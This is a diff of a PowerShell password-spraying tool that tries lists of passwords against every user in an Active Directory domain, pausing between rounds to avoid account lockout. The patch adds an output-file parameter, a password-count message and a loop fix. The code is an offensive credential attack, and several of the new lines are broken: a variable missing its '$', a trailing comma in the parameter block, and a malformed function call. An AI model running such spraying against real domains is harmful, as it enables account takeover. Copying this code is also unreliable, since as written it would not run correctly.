@@ -107,7 +107,7 @@ function Invoke-DomainPasswordSpray{
     }
     catch
     {
-        Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try specifying the domain name with the -Domain option."
+        Write-Host -ForegroundColor "red" "[*] Could not connect to the domain. Try specifying the domain name with the -Domain option."
         break
     }
 
@@ -179,13 +179,13 @@ function Invoke-DomainPasswordSpray{
             break
         }
     }
-    Write-Host -ForegroundColor Yellow "[*] Password spraying has begun."
+    Write-Host -ForegroundColor Yellow "[*] Password spraying has begun with $(Passwords.count) passwords"
     Write-Host "[*] This might take a while depending on the total number of users"
 
     for($i = 0; $i -lt $Passwords.count; $i++)
     {
-        Invoke-SpraySinglePassword($CurrentDomain, $UserListArray, $Passwords[$i])
-        if ($i -lt $Passwords.count)
+        Invoke-SpraySinglePassword($CurrentDomain, $UserListArray, $Passwords[$i], $OutFile)
+        if (($i+1) -lt $Passwords.count)
         {
             Countdown-Timer -Seconds (60*$observation_window)
         }
@@ -441,7 +441,11 @@ function Invoke-SpraySinglePassword
             $UserListArray,
             [Parameter(Position=3)]
             [string]
-            $Password
+            $Password,
+            [Parameter(Position=4)]
+            [string]
+            $OutFile,
+
     )
     $time = Get-Date
     $count = $UserListArray.count
